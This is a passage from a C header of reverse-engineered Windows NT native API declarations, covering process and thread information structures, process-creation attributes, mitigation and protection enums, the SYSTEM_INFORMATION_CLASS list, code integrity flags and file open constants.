    ThreadHeterogeneousCpuPolicy,
    ThreadContainerId,
    ThreadNameInformation,
    ThreadSelectedCpuSets,
    ThreadSystemThreadInformation,
    ThreadActualGroupAffinity,
    ThreadDynamicCodePolicyInfo,
    ThreadExplicitCaseSensitivity,
    ThreadWorkOnBehalfTicket,
    ThreadSubsystemInformation,
    ThreadDbgkWerReportActive,
    ThreadAttachContainer,
    ThreadManageWritesToExecutableMemory,
    ThreadPowerThrottlingState,
    ThreadWorkloadClass,
    MaxThreadInfoClass
} THREADINFOCLASS;

typedef struct _PROCESS_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PVOID PebBaseAddress;
    ULONG_PTR AffinityMask;
    KPRIORITY BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION;
typedef PROCESS_BASIC_INFORMATION *PPROCESS_BASIC_INFORMATION;

typedef struct _THREAD_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PVOID TebBaseAddress;
    CLIENT_ID ClientId;
    ULONG_PTR AffinityMask;
    KPRIORITY Priority;
    LONG BasePriority;
} THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;

typedef struct _PROCESS_EXTENDED_BASIC_INFORMATION {
    SIZE_T Size;
    PROCESS_BASIC_INFORMATION BasicInfo;
    union
    {
        ULONG Flags;
        struct
        {
            ULONG IsProtectedProcess : 1;
            ULONG IsWow64Process : 1;
            ULONG IsProcessDeleting : 1;
            ULONG IsCrossSessionCreate : 1;
            ULONG IsFrozen : 1;
            ULONG IsBackground : 1;
            ULONG IsStronglyNamed : 1;
            ULONG IsSecureProcess : 1;
            ULONG IsSubsystemProcess : 1;
            ULONG SpareBits : 23;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;
} PROCESS_EXTENDED_BASIC_INFORMATION, *PPROCESS_EXTENDED_BASIC_INFORMATION;

typedef struct _PROCESS_ACCESS_TOKEN {
    HANDLE Token;
    HANDLE Thread;
} PROCESS_ACCESS_TOKEN, *PPROCESS_ACCESS_TOKEN;

typedef struct _PROCESS_HANDLE_TABLE_ENTRY_INFO {
    HANDLE HandleValue;
    ULONG_PTR HandleCount;
    ULONG_PTR PointerCount;
    ULONG GrantedAccess;
    ULONG ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} PROCESS_HANDLE_TABLE_ENTRY_INFO, *PPROCESS_HANDLE_TABLE_ENTRY_INFO;

typedef struct _PROCESS_HANDLE_SNAPSHOT_INFORMATION {
    ULONG NumberOfHandles;
    ULONG Reserved;
    PROCESS_HANDLE_TABLE_ENTRY_INFO Handles[1];
} PROCESS_HANDLE_SNAPSHOT_INFORMATION, *PPROCESS_HANDLE_SNAPSHOT_INFORMATION;

//thanks to wj32 headers
typedef enum _PS_MITIGATION_OPTION {
    PS_MITIGATION_OPTION_NX,
    PS_MITIGATION_OPTION_SEHOP,
    PS_MITIGATION_OPTION_FORCE_RELOCATE_IMAGES,
    PS_MITIGATION_OPTION_HEAP_TERMINATE,
    PS_MITIGATION_OPTION_BOTTOM_UP_ASLR,
    PS_MITIGATION_OPTION_HIGH_ENTROPY_ASLR,
    PS_MITIGATION_OPTION_STRICT_HANDLE_CHECKS,
    PS_MITIGATION_OPTION_WIN32K_SYSTEM_CALL_DISABLE,
    PS_MITIGATION_OPTION_EXTENSION_POINT_DISABLE,
    PS_MITIGATION_OPTION_PROHIBIT_DYNAMIC_CODE,
    PS_MITIGATION_OPTION_CONTROL_FLOW_GUARD,
    PS_MITIGATION_OPTION_BLOCK_NON_MICROSOFT_BINARIES,
    PS_MITIGATION_OPTION_FONT_DISABLE,
    PS_MITIGATION_OPTION_IMAGE_LOAD_NO_REMOTE,
    PS_MITIGATION_OPTION_IMAGE_LOAD_NO_LOW_LABEL,
    PS_MITIGATION_OPTION_IMAGE_LOAD_PREFER_SYSTEM32,
    PS_MITIGATION_OPTION_RETURN_FLOW_GUARD,
    PS_MITIGATION_OPTION_LOADER_INTEGRITY_CONTINUITY,
    PS_MITIGATION_OPTION_STRICT_CONTROL_FLOW_GUARD,
    PS_MITIGATION_OPTION_RESTRICT_SET_THREAD_CONTEXT,
    PS_MITIGATION_OPTION_ROP_STACKPIVOT,
    PS_MITIGATION_OPTION_ROP_CALLER_CHECK,
    PS_MITIGATION_OPTION_ROP_SIMEXEC,
    PS_MITIGATION_OPTION_EXPORT_ADDRESS_FILTER,
    PS_MITIGATION_OPTION_EXPORT_ADDRESS_FILTER_PLUS,
    PS_MITIGATION_OPTION_RESTRICT_CHILD_PROCESS_CREATION,
    PS_MITIGATION_OPTION_IMPORT_ADDRESS_FILTER,
    PS_MITIGATION_OPTION_MODULE_TAMPERING_PROTECTION,
    PS_MITIGATION_OPTION_RESTRICT_INDIRECT_BRANCH_PREDICTION,
    PS_MITIGATION_OPTION_SPECULATIVE_STORE_BYPASS_DISABLE,
    PS_MITIGATION_OPTION_ALLOW_DOWNGRADE_DYNAMIC_CODE_POLICY,
    PS_MITIGATION_OPTION_CET_SHADOW_STACKS
} PS_MITIGATION_OPTION;

typedef enum _PS_CREATE_STATE {
    PsCreateInitialState,
    PsCreateFailOnFileOpen,
    PsCreateFailOnSectionCreate,
    PsCreateFailExeFormat,
    PsCreateFailMachineMismatch,
    PsCreateFailExeName,
    PsCreateSuccess,
    PsCreateMaximumStates
} PS_CREATE_STATE;

typedef struct _PS_CREATE_INFO {
    SIZE_T Size;
    PS_CREATE_STATE State;
    union
    {
        struct
        {
            union
            {
                ULONG InitFlags;
                struct
                {
                    UCHAR WriteOutputOnExit : 1;
                    UCHAR DetectManifest : 1;
                    UCHAR IFEOSkipDebugger : 1;
                    UCHAR IFEODoNotPropagateKeyState : 1;
                    UCHAR SpareBits1 : 4;
                    UCHAR SpareBits2 : 8;
                    USHORT ProhibitedImageCharacteristics : 16;
                };
            };
            ACCESS_MASK AdditionalFileAccess;
        } InitState;

        struct
        {
            HANDLE FileHandle;
        } FailSection;

        struct
        {
            USHORT DllCharacteristics;
        } ExeFormat;

        struct
        {
            HANDLE IFEOKey;
        } ExeName;

        struct
        {
            union
            {
                ULONG OutputFlags;
                struct
                {
                    UCHAR ProtectedProcess : 1;
                    UCHAR AddressSpaceOverride : 1;
                    UCHAR DevOverrideEnabled : 1;
                    UCHAR ManifestDetected : 1;
                    UCHAR ProtectedProcessLight : 1;
                    UCHAR SpareBits1 : 3;
                    UCHAR SpareBits2 : 8;
                    USHORT SpareBits3 : 16;
                };
            };
            HANDLE FileHandle;
            HANDLE SectionHandle;
            ULONGLONG UserProcessParametersNative;
            ULONG UserProcessParametersWow64;
            ULONG CurrentParameterFlags;
            ULONGLONG PebAddressNative;
            ULONG PebAddressWow64;
            ULONGLONG ManifestAddress;
            ULONG ManifestSize;
        } SuccessState;
    };
} PS_CREATE_INFO, *PPS_CREATE_INFO;

typedef struct _PS_ATTRIBUTE {
    ULONG Attribute;
    SIZE_T Size;
    union
    {
        ULONG Value;
        PVOID ValuePtr;
    };
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST {
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;

typedef enum _PS_PROTECTED_TYPE {
    PsProtectedTypeNone,
    PsProtectedTypeProtectedLight,
    PsProtectedTypeProtected,
    PsProtectedTypeMax
} PS_PROTECTED_TYPE;

typedef enum _PS_PROTECTED_SIGNER {
    PsProtectedSignerNone,
    PsProtectedSignerAuthenticode,
    PsProtectedSignerCodeGen,
    PsProtectedSignerAntimalware,
    PsProtectedSignerLsa,
    PsProtectedSignerWindows,
    PsProtectedSignerWinTcb,
    PsProtectedSignerWinSystem,
    PsProtectedSignerApp,
    PsProtectedSignerMax
} PS_PROTECTED_SIGNER;

typedef struct _PS_PROTECTION {
    union
    {
        UCHAR Level;
        struct
        {
            UCHAR Type : 3;
            UCHAR Audit : 1;
            UCHAR Signer : 4;
        };
    };
} PS_PROTECTION, *PPS_PROTECTION;

// begin_rev
#define PS_ATTRIBUTE_NUMBER_MASK 0x0000ffff
#define PS_ATTRIBUTE_THREAD 0x00010000 
#define PS_ATTRIBUTE_INPUT 0x00020000 
#define PS_ATTRIBUTE_ADDITIVE 0x00040000 
// end_rev

typedef enum _PS_ATTRIBUTE_NUM {
    PsAttributeParentProcess,
    PsAttributeDebugPort,
    PsAttributeToken,
    PsAttributeClientId,
    PsAttributeTebAddress,
    PsAttributeImageName,
    PsAttributeImageInfo,
    PsAttributeMemoryReserve,
    PsAttributePriorityClass,
    PsAttributeErrorMode,
    PsAttributeStdHandleInfo,
    PsAttributeHandleList,
    PsAttributeGroupAffinity,
    PsAttributePreferredNode,
    PsAttributeIdealProcessor,
    PsAttributeUmsThread,
    PsAttributeMitigationOptions,
    PsAttributeProtectionLevel,
    PsAttributeSecureProcess,
    PsAttributeJobList,
    PsAttributeChildProcessPolicy,
    PsAttributeAllApplicationPackagesPolicy,
    PsAttributeWin32kFilter,
    PsAttributeSafeOpenPromptOriginClaim,
    PsAttributeBnoIsolation,
    PsAttributeDesktopAppPolicy,
    PsAttributeChpe,
    PsAttributeMax
} PS_ATTRIBUTE_NUM;

#define PsAttributeValue(Number, Thread, Input, Unknown) \
    (((Number) & PS_ATTRIBUTE_NUMBER_MASK) | \
    ((Thread) ? PS_ATTRIBUTE_THREAD : 0) | \
    ((Input) ? PS_ATTRIBUTE_INPUT : 0) | \
    ((Unknown) ? PS_ATTRIBUTE_ADDITIVE : 0))

#define PS_ATTRIBUTE_PARENT_PROCESS \
    PsAttributeValue(PsAttributeParentProcess, FALSE, TRUE, TRUE)
#define PS_ATTRIBUTE_DEBUG_PORT \
    PsAttributeValue(PsAttributeDebugPort, FALSE, TRUE, TRUE)
#define PS_ATTRIBUTE_TOKEN \
    PsAttributeValue(PsAttributeToken, FALSE, TRUE, TRUE)
#define PS_ATTRIBUTE_CLIENT_ID \
    PsAttributeValue(PsAttributeClientId, TRUE, FALSE, FALSE)
#define PS_ATTRIBUTE_TEB_ADDRESS \
    PsAttributeValue(PsAttributeTebAddress, TRUE, FALSE, FALSE)
#define PS_ATTRIBUTE_IMAGE_NAME \
    PsAttributeValue(PsAttributeImageName, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_IMAGE_INFO \
    PsAttributeValue(PsAttributeImageInfo, FALSE, FALSE, FALSE)
#define PS_ATTRIBUTE_MEMORY_RESERVE \
    PsAttributeValue(PsAttributeMemoryReserve, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_PRIORITY_CLASS \
    PsAttributeValue(PsAttributePriorityClass, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_ERROR_MODE \
    PsAttributeValue(PsAttributeErrorMode, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_STD_HANDLE_INFO \
    PsAttributeValue(PsAttributeStdHandleInfo, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_HANDLE_LIST \
    PsAttributeValue(PsAttributeHandleList, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_GROUP_AFFINITY \
    PsAttributeValue(PsAttributeGroupAffinity, TRUE, TRUE, FALSE)
#define PS_ATTRIBUTE_PREFERRED_NODE \
    PsAttributeValue(PsAttributePreferredNode, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_IDEAL_PROCESSOR \
    PsAttributeValue(PsAttributeIdealProcessor, TRUE, TRUE, FALSE)
#define PS_ATTRIBUTE_UMS_THREAD \
    PsAttributeValue(PsAttributeUmsThread, TRUE, TRUE, FALSE)
#define PS_ATTRIBUTE_MITIGATION_OPTIONS \
    PsAttributeValue(PsAttributeMitigationOptions, FALSE, TRUE, TRUE)
#define PS_ATTRIBUTE_PROTECTION_LEVEL \
    PsAttributeValue(PsAttributeProtectionLevel, FALSE, TRUE, TRUE)
#define PS_ATTRIBUTE_SECURE_PROCESS \
    PsAttributeValue(PsAttributeSecureProcess, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_JOB_LIST \
    PsAttributeValue(PsAttributeJobList, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_CHILD_PROCESS_POLICY \
    PsAttributeValue(PsAttributeChildProcessPolicy, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_ALL_APPLICATION_PACKAGES_POLICY \
    PsAttributeValue(PsAttributeAllApplicationPackagesPolicy, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_WIN32K_FILTER \
    PsAttributeValue(PsAttributeWin32kFilter, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_SAFE_OPEN_PROMPT_ORIGIN_CLAIM \
    PsAttributeValue(PsAttributeSafeOpenPromptOriginClaim, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_BNO_ISOLATION \
    PsAttributeValue(PsAttributeBnoIsolation, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_DESKTOP_APP_POLICY \
    PsAttributeValue(PsAttributeDesktopAppPolicy, FALSE, TRUE, FALSE)

#define RTL_USER_PROC_PARAMS_NORMALIZED     0x00000001
#define RTL_USER_PROC_PROFILE_USER          0x00000002
#define RTL_USER_PROC_PROFILE_KERNEL        0x00000004
#define RTL_USER_PROC_PROFILE_SERVER        0x00000008
#define RTL_USER_PROC_RESERVE_1MB           0x00000020
#define RTL_USER_PROC_RESERVE_16MB          0x00000040
#define RTL_USER_PROC_CASE_SENSITIVE        0x00000080
#define RTL_USER_PROC_DISABLE_HEAP_DECOMMIT 0x00000100
#define RTL_USER_PROC_DLL_REDIRECTION_LOCAL 0x00001000
#define RTL_USER_PROC_APP_MANIFEST_PRESENT  0x00002000
#define RTL_USER_PROC_IMAGE_KEY_MISSING     0x00004000
#define RTL_USER_PROC_OPTIN_PROCESS         0x00020000

/*
** Processes END
*/

typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemBasicInformation = 0,
    SystemProcessorInformation = 1,
    SystemPerformanceInformation = 2,
    SystemTimeOfDayInformation = 3,
    SystemPathInformation = 4,
    SystemProcessInformation = 5,
    SystemCallCountInformation = 6,
    SystemDeviceInformation = 7,
    SystemProcessorPerformanceInformation = 8,
    SystemFlagsInformation = 9,
    SystemCallTimeInformation = 10,
    SystemModuleInformation = 11,
    SystemLocksInformation = 12,
    SystemStackTraceInformation = 13,
    SystemPagedPoolInformation = 14,
    SystemNonPagedPoolInformation = 15,
    SystemHandleInformation = 16,
    SystemObjectInformation = 17,
    SystemPageFileInformation = 18,
    SystemVdmInstemulInformation = 19,
    SystemVdmBopInformation = 20,
    SystemFileCacheInformation = 21,
    SystemPoolTagInformation = 22,
    SystemInterruptInformation = 23,
    SystemDpcBehaviorInformation = 24,
    SystemFullMemoryInformation = 25,
    SystemLoadGdiDriverInformation = 26,
    SystemUnloadGdiDriverInformation = 27,
    SystemTimeAdjustmentInformation = 28,
    SystemSummaryMemoryInformation = 29,
    SystemMirrorMemoryInformation = 30,
    SystemPerformanceTraceInformation = 31,
    SystemObsolete0 = 32,
    SystemExceptionInformation = 33,
    SystemCrashDumpStateInformation = 34,
    SystemKernelDebuggerInformation = 35,
    SystemContextSwitchInformation = 36,
    SystemRegistryQuotaInformation = 37,
    SystemExtendServiceTableInformation = 38,
    SystemPrioritySeperation = 39,
    SystemVerifierAddDriverInformation = 40,
    SystemVerifierRemoveDriverInformation = 41,
    SystemProcessorIdleInformation = 42,
    SystemLegacyDriverInformation = 43,
    SystemCurrentTimeZoneInformation = 44,
    SystemLookasideInformation = 45,
    SystemTimeSlipNotification = 46,
    SystemSessionCreate = 47,
    SystemSessionDetach = 48,
    SystemSessionInformation = 49,
    SystemRangeStartInformation = 50,
    SystemVerifierInformation = 51,
    SystemVerifierThunkExtend = 52,
    SystemSessionProcessInformation = 53,
    SystemLoadGdiDriverInSystemSpace = 54,
    SystemNumaProcessorMap = 55,
    SystemPrefetcherInformation = 56,
    SystemExtendedProcessInformation = 57,
    SystemRecommendedSharedDataAlignment = 58,
    SystemComPlusPackage = 59,
    SystemNumaAvailableMemory = 60,
    SystemProcessorPowerInformation = 61,
    SystemEmulationBasicInformation = 62,
    SystemEmulationProcessorInformation = 63,
    SystemExtendedHandleInformation = 64,
    SystemLostDelayedWriteInformation = 65,
    SystemBigPoolInformation = 66,
    SystemSessionPoolTagInformation = 67,
    SystemSessionMappedViewInformation = 68,
    SystemHotpatchInformation = 69,
    SystemObjectSecurityMode = 70,
    SystemWatchdogTimerHandler = 71,
    SystemWatchdogTimerInformation = 72,
    SystemLogicalProcessorInformation = 73,
    SystemWow64SharedInformationObsolete = 74,
    SystemRegisterFirmwareTableInformationHandler = 75,
    SystemFirmwareTableInformation = 76,
    SystemModuleInformationEx = 77,
    SystemVerifierTriageInformation = 78,
    SystemSuperfetchInformation = 79,
    SystemMemoryListInformation = 80,
    SystemFileCacheInformationEx = 81,
    SystemThreadPriorityClientIdInformation = 82,
    SystemProcessorIdleCycleTimeInformation = 83,
    SystemVerifierCancellationInformation = 84,
    SystemProcessorPowerInformationEx = 85,
    SystemRefTraceInformation = 86,
    SystemSpecialPoolInformation = 87,
    SystemProcessIdInformation = 88,
    SystemErrorPortInformation = 89,
    SystemBootEnvironmentInformation = 90,
    SystemHypervisorInformation = 91,
    SystemVerifierInformationEx = 92,
    SystemTimeZoneInformation = 93,
    SystemImageFileExecutionOptionsInformation = 94,
    SystemCoverageInformation = 95,
    SystemPrefetchPatchInformation = 96,
    SystemVerifierFaultsInformation = 97,
    SystemSystemPartitionInformation = 98,
    SystemSystemDiskInformation = 99,
    SystemProcessorPerformanceDistribution = 100,
    SystemNumaProximityNodeInformation = 101,
    SystemDynamicTimeZoneInformation = 102,
    SystemCodeIntegrityInformation = 103,
    SystemProcessorMicrocodeUpdateInformation = 104,
    SystemProcessorBrandString = 105,
    SystemVirtualAddressInformation = 106,
    SystemLogicalProcessorAndGroupInformation = 107,
    SystemProcessorCycleTimeInformation = 108,
    SystemStoreInformation = 109,
    SystemRegistryAppendString = 110,
    SystemAitSamplingValue = 111,
    SystemVhdBootInformation = 112,
    SystemCpuQuotaInformation = 113,
    SystemNativeBasicInformation = 114,
    SystemErrorPortTimeouts = 115,
    SystemLowPriorityIoInformation = 116,
    SystemBootEntropyInformation = 117,
    SystemVerifierCountersInformation = 118,
    SystemPagedPoolInformationEx = 119,
    SystemSystemPtesInformationEx = 120,
    SystemNodeDistanceInformation = 121,
    SystemAcpiAuditInformation = 122,
    SystemBasicPerformanceInformation = 123,
    SystemQueryPerformanceCounterInformation = 124,
    SystemSessionBigPoolInformation = 125,
    SystemBootGraphicsInformation = 126,
    SystemScrubPhysicalMemoryInformation = 127,
    SystemBadPageInformation = 128,
    SystemProcessorProfileControlArea = 129,
    SystemCombinePhysicalMemoryInformation = 130,
    SystemEntropyInterruptTimingInformation = 131,
    SystemConsoleInformation = 132,
    SystemPlatformBinaryInformation = 133,
    SystemPolicyInformation = 134,
    SystemHypervisorProcessorCountInformation = 135,
    SystemDeviceDataInformation = 136,
    SystemDeviceDataEnumerationInformation = 137,
    SystemMemoryTopologyInformation = 138,
    SystemMemoryChannelInformation = 139,
    SystemBootLogoInformation = 140,
    SystemProcessorPerformanceInformationEx = 141,
    SystemSpare0 = 142,
    SystemSecureBootPolicyInformation = 143,
    SystemPageFileInformationEx = 144,
    SystemSecureBootInformation = 145,
    SystemEntropyInterruptTimingRawInformation = 146,
    SystemPortableWorkspaceEfiLauncherInformation = 147,
    SystemFullProcessInformation = 148,
    SystemKernelDebuggerInformationEx = 149,
    SystemBootMetadataInformation = 150,
    SystemSoftRebootInformation = 151,
    SystemElamCertificateInformation = 152,
    SystemOfflineDumpConfigInformation = 153,
    SystemProcessorFeaturesInformation = 154,
    SystemRegistryReconciliationInformation = 155,
    SystemEdidInformation = 156,
    SystemManufacturingInformation = 157,
    SystemEnergyEstimationConfigInformation = 158,
    SystemHypervisorDetailInformation = 159,
    SystemProcessorCycleStatsInformation = 160,
    SystemVmGenerationCountInformation = 161,
    SystemTrustedPlatformModuleInformation = 162,
    SystemKernelDebuggerFlags = 163,
    SystemCodeIntegrityPolicyInformation = 164,
    SystemIsolatedUserModeInformation = 165,
    SystemHardwareSecurityTestInterfaceResultsInformation = 166,
    SystemSingleModuleInformation = 167,
    SystemAllowedCpuSetsInformation = 168,
    SystemDmaProtectionInformation = 169,
    SystemInterruptCpuSetsInformation = 170,
    SystemSecureBootPolicyFullInformation = 171,
    SystemCodeIntegrityPolicyFullInformation = 172,
    SystemAffinitizedInterruptProcessorInformation = 173,
    SystemRootSiloInformation = 174,
    SystemCpuSetInformation = 175,
    SystemCpuSetTagInformation = 176,
    SystemWin32WerStartCallout = 177,
    SystemSecureKernelProfileInformation = 178,
    SystemCodeIntegrityPlatformManifestInformation = 179,
    SystemInterruptSteeringInformation = 180,
    SystemSupportedProcessorArchitectures = 181,
    SystemMemoryUsageInformation = 182,
    SystemCodeIntegrityCertificateInformation = 183,
    SystemPhysicalMemoryInformation = 184,
    SystemControlFlowTransition = 185,
    SystemKernelDebuggingAllowed = 186,
    SystemActivityModerationExeState = 187,
    SystemActivityModerationUserSettings = 188,
    SystemCodeIntegrityPoliciesFullInformation = 189,
    SystemCodeIntegrityUnlockInformation = 190,
    SystemIntegrityQuotaInformation = 191,
    SystemFlushInformation = 192,
    SystemProcessorIdleMaskInformation = 193,
    SystemSecureDumpEncryptionInformation = 194,
    SystemWriteConstraintInformation = 195,
    SystemKernelVaShadowInformation = 196,
    SystemHypervisorSharedPageInformation = 197,
    SystemFirmwareBootPerformanceInformation = 198,
    SystemCodeIntegrityVerificationInformation = 199,
    SystemFirmwarePartitionInformation = 200,
    SystemSpeculationControlInformation = 201,
    SystemDmaGuardPolicyInformation = 202,
    SystemEnclaveLaunchControlInformation = 203,
    SystemWorkloadAllowedCpuSetsInformation = 204,
    SystemCodeIntegrityUnlockModeInformation = 205,
    SystemLeapSecondInformation = 206,
    SystemFlags2Information = 207,
    MaxSystemInfoClass
} SYSTEM_INFORMATION_CLASS, *PSYSTEM_INFORMATION_CLASS;

//msdn.microsoft.com/en-us/library/windows/desktop/ms724509(v=vs.85).aspx
typedef struct _SYSTEM_SPECULATION_CONTROL_INFORMATION {
    struct {
        ULONG BpbEnabled : 1;
        ULONG BpbDisabledSystemPolicy : 1;
        ULONG BpbDisabledNoHardwareSupport : 1;
        ULONG SpecCtrlEnumerated : 1;
        ULONG SpecCmdEnumerated : 1;
        ULONG IbrsPresent : 1;
        ULONG StibpPresent : 1;
        ULONG SmepPresent : 1;
        ULONG MemoryDisambiguationDisableAvailable : 1;
        ULONG MemoryDisambiguationDisableSupported : 1;
        ULONG MemoryDisambiguationDisabledSystemWide : 1;
        ULONG MemoryDisambiguationDisabledKernel : 1;
        ULONG MemoryDisambiguationDisableRequired : 1;
        ULONG Reserved : 19;
    } SpeculationControlFlags;
} SYSTEM_SPECULATION_CONTROL_INFORMATION, *PSYSTEM_SPECULATION_CONTROL_INFORMATION;

typedef struct _SYSTEM_KERNEL_VA_SHADOW_INFORMATION {
    struct {
        ULONG KvaShadowEnabled : 1;
        ULONG KvaShadowUserGlobal : 1;
        ULONG KvaShadowPcid : 1;
        ULONG KvaShadowInvpcid : 1;
        ULONG KvaShadowRequired : 1;
        ULONG KvaShadowRequiredAvailable : 1;
        ULONG Reserved : 26;
    } KvaShadowFlags;
} SYSTEM_KERNEL_VA_SHADOW_INFORMATION, *PSYSTEM_KERNEL_VA_SHADOW_INFORMATION;

typedef struct _SYSTEM_CODEINTEGRITY_INFORMATION {
    ULONG  Length;
    ULONG  CodeIntegrityOptions;
} SYSTEM_CODEINTEGRITY_INFORMATION, *PSYSTEM_CODEINTEGRITY_INFORMATION;

#define CODEINTEGRITY_OPTION_ENABLED                      0x01
#define CODEINTEGRITY_OPTION_TESTSIGN                     0x02
#define CODEINTEGRITY_OPTION_UMCI_ENABLED                 0x04
#define CODEINTEGRITY_OPTION_UMCI_AUDITMODE_ENABLED       0x08
#define CODEINTEGRITY_OPTION_UMCI_EXCLUSIONPATHS_ENABLED  0x10
#define CODEINTEGRITY_OPTION_TEST_BUILD                   0x20
#define CODEINTEGRITY_OPTION_PREPRODUCTION_BUILD          0x40
#define CODEINTEGRITY_OPTION_DEBUGMODE_ENABLED            0x80
#define CODEINTEGRITY_OPTION_FLIGHT_BUILD                 0x100
#define CODEINTEGRITY_OPTION_FLIGHTING_ENABLED            0x200
#define CODEINTEGRITY_OPTION_HVCI_KMCI_ENABLED            0x400
#define CODEINTEGRITY_OPTION_HVCI_KMCI_AUDITMODE_ENABLED  0x800
#define CODEINTEGRITY_OPTION_HVCI_KMCI_STRICTMODE_ENABLED 0x1000
#define CODEINTEGRITY_OPTION_HVCI_IUM_ENABLED             0x2000

typedef VOID(NTAPI *PIO_APC_ROUTINE)(
    _In_ PVOID ApcContext,
    _In_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ ULONG Reserved
    );

#define InitializeObjectAttributes( p, n, a, r, s ) { \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
    }

typedef struct _SYSTEM_VHD_BOOT_INFORMATION {
    BOOLEAN OsDiskIsVhd;
    ULONG OsVhdFilePathOffset;
    WCHAR OsVhdParentVolume[ANYSIZE_ARRAY];
} SYSTEM_VHD_BOOT_INFORMATION, *PSYSTEM_VHD_BOOT_INFORMATION;

typedef struct _SYSTEM_OBJECTTYPE_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfObjects;
    ULONG NumberOfHandles;
    ULONG TypeIndex;
    ULONG InvalidAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG ValidAccessMask;
    ULONG PoolType;
    BOOLEAN SecurityRequired;
    BOOLEAN WaitableObject;
    UNICODE_STRING TypeName;
} SYSTEM_OBJECTTYPE_INFORMATION, *PSYSTEM_OBJECTTYPE_INFORMATION;

typedef struct _SYSTEM_OBJECT_INFORMATION {
    ULONG NextEntryOffset;
    PVOID Object;
    HANDLE CreatorUniqueProcess;
    USHORT CreatorBackTraceIndex;
    USHORT Flags;
    LONG PointerCount;
    LONG HandleCount;
    ULONG PagedPoolCharge;
    ULONG NonPagedPoolCharge;
    HANDLE ExclusiveProcessId;
    PVOID SecurityDescriptor;
    UNICODE_STRING NameInfo;
} SYSTEM_OBJECT_INFORMATION, *PSYSTEM_OBJECT_INFORMATION;

/*
** Boot Entry START
*/

typedef struct _FILE_PATH {
    ULONG Version;
    ULONG Length;
    ULONG Type;
    UCHAR FilePath[ANYSIZE_ARRAY];
} FILE_PATH, *PFILE_PATH;

typedef struct _BOOT_ENTRY {
    ULONG Version;
    ULONG Length;
    ULONG Id;
    ULONG Attributes;
    ULONG FriendlyNameOffset;
    ULONG BootFilePathOffset;
    ULONG OsOptionsLength;
    UCHAR OsOptions[ANYSIZE_ARRAY];
} BOOT_ENTRY, *PBOOT_ENTRY;

typedef struct _BOOT_ENTRY_LIST {
    ULONG NextEntryOffset;
    BOOT_ENTRY BootEntry;
} BOOT_ENTRY_LIST, *PBOOT_ENTRY_LIST;

/*
** Boot Entry END
*/

/*
** File start
*/

#define FILE_SUPERSEDE                          0x00000000
#define FILE_OPEN                               0x00000001
#define FILE_CREATE                             0x00000002
#define FILE_OPEN_IF                            0x00000003
#define FILE_OVERWRITE                          0x00000004
#define FILE_OVERWRITE_IF                       0x00000005
#define FILE_MAXIMUM_DISPOSITION                0x00000005

#define FILE_DIRECTORY_FILE                     0x00000001
#define FILE_WRITE_THROUGH                      0x00000002
#define FILE_SEQUENTIAL_ONLY                    0x00000004
#define FILE_NO_INTERMEDIATE_BUFFERING          0x00000008

#define FILE_SYNCHRONOUS_IO_ALERT               0x00000010
#define FILE_SYNCHRONOUS_IO_NONALERT            0x00000020
#define FILE_NON_DIRECTORY_FILE                 0x00000040
#define FILE_CREATE_TREE_CONNECTION             0x00000080

#define FILE_COMPLETE_IF_OPLOCKED               0x00000100
#define FILE_NO_EA_KNOWLEDGE                    0x00000200
#define FILE_OPEN_FOR_RECOVERY                  0x00000400
#define FILE_RANDOM_ACCESS                      0x00000800

#define FILE_DELETE_ON_CLOSE                    0x00001000
#define FILE_OPEN_BY_FILE_ID                    0x00002000
#define FILE_OPEN_FOR_BACKUP_INTENT             0x00004000
#define FILE_NO_COMPRESSION                     0x00008000

#define FILE_RESERVE_OPFILTER                   0x00100000
#define FILE_OPEN_REPARSE_POINT                 0x00200000
#define FILE_OPEN_NO_RECALL                     0x00400000
#define FILE_OPEN_FOR_FREE_SPACE_QUERY          0x00800000


#define FILE_COPY_STRUCTURED_STORAGE            0x00000041
#define FILE_STRUCTURED_STORAGE                 0x00000441

#define FILE_VALID_OPTION_FLAGS                 0x00ffffff
#define FILE_VALID_PIPE_OPTION_FLAGS            0x00000032
#define FILE_VALID_MAILSLOT_OPTION_FLAGS        0x00000032
#define FILE_VALID_SET_FLAGS                    0x00000036

typedef enum _FILE_INFORMATION_CLASS {
    FileDirectoryInformation = 1,
    FileFullDirectoryInformation,
    FileBothDirectoryInformation,
    FileBasicInformation,
    FileStandardInformation,
    FileInternalInformation,
    FileEaInformation,
    FileAccessInformation,
    FileNameInformation,
    FileRenameInformation,
    FileLinkInformation,
    FileNamesInformation,
    FileDispositionInformation,
    FilePositionInformation,
    FileFullEaInformation,
    FileModeInformation,
    FileAlignmentInformation,
    FileAllInformation,
    FileAllocationInformation,
    FileEndOfFileInformation,
    FileAlternateNameInformation,
    FileStreamInformation,
    FilePipeInformation,
